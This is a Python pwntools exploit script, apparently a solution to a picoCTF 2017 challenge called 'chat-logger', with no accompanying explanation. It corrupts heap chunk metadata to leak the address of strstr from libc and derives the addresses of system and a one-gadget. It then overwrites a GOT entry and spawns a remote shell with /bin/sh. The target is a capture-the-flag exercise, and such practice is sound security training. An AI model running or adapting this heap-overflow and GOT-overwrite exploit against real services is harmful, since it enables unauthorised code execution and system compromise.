from pwn import *

#r = process('./chat-logger')
r = remote('shell2017.picoctf.com', 60884)

def run_cmd(cmd, line=True):
    print r.recvuntil('> ')
    r.sendline(cmd)
    if line:
        return r.recvline()

run_cmd('find 2 No, I would')
for _ in range(4):
    run_cmd('add 5 AAAAAAAAA')
#for _ in range(1):
#    run_cmd('add 5 {}'.format('A'*245))
run_cmd('add 5 {}'.format('B'*50))
run_cmd('add 5 A')
run_cmd('add 5 {}'.format('C'*90))
run_cmd('find 1 Au revoir')
#run_cmd('add 5 {}'.format('D'*100))
run_cmd('add 5 /bin/sh')
run_cmd('find 2 not that funny')
run_cmd('edit {}\xa0'.format('E'*38)) # must be multiple of 8
run_cmd('find 2 CCCCCC')
#d = 'edit {}{}{}{}{}{}{}{}{}\n'.format('C'*102, p64(0x31), p64(0x5), p64(8), p64(0x601ed8 - 2), p64(0), p64(0), p64(0x71), 'E'*2)
raw_input()
d = 'edit {}{}{}{}{}'.format('C'*(90 + 12), p64(0x0101010101010131), p64(0x0101010101010105), p64(0x0101010101010104), '\xd8\x1e\x60')
print run_cmd(d)
ch = run_cmd('chat 1')
r.recvlines(35)
imp = r.recvline()
r.recvline()
raw = imp.split(' ', 1)[1].strip()
print('raw = {}'.format(raw))
strstr = unpack(raw, 'all')
print('strstr = {}'.format(hex(strstr)))
system = strstr - 368112
magic = system + 612839
print('system = {}'.format(hex(system)))
print('magic = {}'.format(hex(magic)))
d = 'edit {}{}{}{}{}'.format('C'*(90 + 12), p64(0x0101010101010131), p64(0x0101010101010105), p64(0x0101010101010104), '\xd0\x1e\x60')
print run_cmd(d)
print run_cmd('find 1 f')
print run_cmd('edit zzzzz')
print run_cmd('find 2 CCCCCC')
d = 'edit {}{}{}{}{}'.format('C'*(90 + 12), p64(0x0101010101010131), p64(0x0101010101010105), p64(0x0101010101010104), '\xd6\x1e\x60') # write 2 bytes before
print run_cmd(d)

print run_cmd('find 1 z')
system_hex = pack(system, 'all')
print('setting to {}'.format(system_hex))
print run_cmd('edit {}'.format(system_hex))
r.sendline('find 1 /bin/sh')
r.interactive()
